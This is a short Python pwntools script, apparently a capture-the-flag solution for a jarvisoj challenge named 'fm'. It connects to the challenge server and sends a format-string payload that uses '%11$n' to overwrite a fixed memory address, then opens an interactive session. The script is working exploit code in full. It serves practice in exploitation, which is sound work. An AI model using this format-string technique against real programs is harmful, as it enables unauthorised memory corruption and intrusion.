from pwn import *
p = remote('pwn2.jarvisoj.com', 9895)
# p = process('./fm')
x_addr = 0x0804A02C
print hex(x_addr)
payload = p32(x_addr) + '%11$n'
p.sendline(payload)
p.interactive()